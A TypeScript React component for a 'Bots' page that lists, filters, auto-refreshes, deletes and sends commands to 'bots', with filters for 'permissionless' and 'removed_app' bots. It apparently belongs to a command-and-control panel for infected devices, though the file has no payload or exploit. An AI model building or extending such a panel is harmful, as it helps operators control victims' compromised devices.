import React, {useEffect, useLayoutEffect, useState} from "react";
import {Button, Col, message, Modal, Pagination, Result, Row, Skeleton, Space, Tag} from "antd";
import {useDispatch, useSelector} from "react-redux";
import {
    changeBotsFilter,
    deleteBots,
    deleteRemovedAppBots,
    getBotsList,
    selectedBotsClear,
    setBotPage,
} from "../../../Store/Bots/Actions";
import {AppState} from "../../../Store/RootReducer";
import BotsItem from "./BotsItem";
import BotsFilter from "./BotsFilter";
import {CodeOutlined, DeleteOutlined} from "@ant-design/icons";
import {scrollToTop} from "../../../Util/scrollToTop";
import {setCountAction} from "../../../Store/Counts/Actions";
import MultiCommandsModal from "../../Modals/CommandsModal/MultiCommandsModal";
import {Bot} from "../../../Model/Bot";
import useInterval from "../../../Hook/useInterval";

const {CheckableTag} = Tag;

const Bots: React.FC = () => {
    const dispatch = useDispatch();

    const botsReducer = useSelector((state: AppState) => state.bots);
    const countsReducer = useSelector((state: AppState) => state.counts);

    useLayoutEffect(() => {
        dispatch(getBotsList(botsReducer.filters, botsReducer.page, botsReducer.per_page));
    }, [botsReducer.filters, botsReducer.page, botsReducer.per_page]);

    useInterval(() => dispatch(getBotsList(botsReducer.filters, botsReducer.page, botsReducer.per_page)), 7000);

    useEffect(() => {
        dispatch(setCountAction({
            bots: countsReducer.permissionless_bots,
        }));
    }, [botsReducer.total, dispatch]);

    const [showCommands, setShowCommands] = useState(false);

    const paginationChangeHandler = (pageNumber: number, size: number) => {
        if (botsReducer.isLoaded &&
            botsReducer.page === botsReducer.loaded_page &&
            botsReducer.page === botsReducer.loaded_page &&
            botsReducer.loaded_per_page === botsReducer.per_page) {
            scrollToTop();
            dispatch(setBotPage(pageNumber, size));
        }
    };

    const [checked, setChecked] = useState(false);

    const onChangePermissionless = () => {
        const isChecked: boolean = !checked;
        setChecked(isChecked);
        let types: string[] = botsReducer.filters.types;

        if (isChecked) {
            types.push("permissionless");
        } else {
            types = types.filter((type: string) => type !== "permissionless");
        }

        dispatch(changeBotsFilter({
            types: types,
        }));
    };

    const isLoaded = botsReducer.isLoaded && botsReducer.page === botsReducer.loaded_page && botsReducer.loaded_per_page === botsReducer.per_page;

    return (
        <>
            <div className="panel-header">
                <h2 className="panel-title">Bots</h2>
            </div>

            <BotsFilter />

            <div className="panel-content">
                <div className="bots-list-actions">
                    <Space size={15}>
                        <div className="space-group" style={{display: "flex", gap: 15}}>
                            <Button
                                type="primary"
                                icon={<CodeOutlined/>}
                                onClick={() => setShowCommands(true)}
                                disabled={botsReducer.selectedBots.length === 0}
                            />

                            <Button
                                type="primary"
                                icon={<DeleteOutlined/>}
                                disabled={botsReducer.selectedBots.length === 0}
                                onClick={() => {
                                    Modal.confirm({
                                        title: "Delete selected bots?",
                                        content: "This action can`t be undone",
                                        onOk: () => {
                                            dispatch(deleteBots(botsReducer.selectedBots.map((bot: Bot) => bot.id)));
                                        },
                                    });
                                }}
                            />
                        </div>

                        {botsReducer.selectedBots.length > 0 && (
                            <>
                                <span>
                                    Multiple actions: (<b>{botsReducer.selectedBots.length}</b> bots seleсted)
                                </span>
                                <a
                                    href="/"
                                    onClick={(e) => {
                                        e.preventDefault();
                                        dispatch(selectedBotsClear());
                                    }}
                                >
                                    &times; Clear selection
                                </a>
                            </>
                        )}

                        <Button type={"default"}>Select all bots</Button>

                        <Button
                            type="default"
                            onClick={() => {
                                Modal.confirm({
                                    title: (<>Wipe all <code className="code">removed_app</code> bots?</>),
                                    content: (<>This action will delete all <code className="code">removed_app</code> bots</>),
                                    onOk: () => dispatch(deleteRemovedAppBots()),
                                    okButtonProps: {
                                        danger: true,
                                    },
                                    okText: "Yes, wipe",
                                    closable: true,
                                });
                            }}
                        >
                            Wipe all&nbsp;<span style={{color: "gray"}}>removed_app</span>&nbsp;bots
                        </Button>
                    </Space>
                </div>

                <br/>

                <CheckableTag
                    checked={checked}
                    onClick={() => onChangePermissionless()}
                    className="toggle-tag"
                >
                    <Space size={15}>
                        <span>
                            Permissionless
                        </span>
                        {countsReducer.permissionless_bots > 0 && (
                            <div className="toggle-tag-counter">
                                +{countsReducer.permissionless_bots}
                            </div>
                        )}
                    </Space>
                </CheckableTag>
                {
                    isLoaded ? (
                        <>
                            <Row className="bots-list" gutter={15}>
                                {botsReducer.bots.length > 0 ? botsReducer.bots.map((bot, id) => {
                                    return (
                                        <BotsItem
                                            bot={bot}
                                            bots={botsReducer.bots}
                                            isLoaded={botsReducer.isLoaded}
                                            key={id}
                                        />
                                    );
                                }) : (
                                    <Col span={24}>
                                        <div className="bots-list-404">
                                            <Result
                                                status="warning"
                                                title="Bots not found :\"
                                                subTitle="Sorry, the bots you searched does not exist."
                                                extra={
                                                    <Button
                                                        type="primary"
                                                        onClick={() => {
                                                            message.success("callback");
                                                        }}
                                                    >
                                                        Show all
                                                    </Button>
                                                }
                                            />
                                        </div>
                                    </Col>
                                )}
                            </Row>
                        </>
                    ) : (
                        <Row gutter={15}>
                            {[...Array(botsReducer.per_page)].map((x, i) => (
                                <Col xxl={6} xl={12} lg={12} md={12} sm={24} xs={24} key={i}>
                                    <div className="bot-item">
                                        <Skeleton
                                            loading={true}
                                            paragraph={{rows: 17}}
                                            title={true}
                                            active
                                        />
                                    </div>
                                </Col>
                            ))}
                        </Row>
                    )
                }

                <MultiCommandsModal
                    visible={showCommands}
                    setVisible={setShowCommands}
                />

                <Pagination
                    total={botsReducer.total}
                    defaultPageSize={botsReducer.per_page}
                    pageSizeOptions={["4", "12", "24", "48"]}
                    onChange={paginationChangeHandler}
                    showSizeChanger={true}
                    current={botsReducer.page}
                    disabled={botsReducer.loaded_page !== botsReducer.page || botsReducer.loaded_per_page !== botsReducer.per_page}
                />

            </div>

        </>
    );
};

export default Bots;
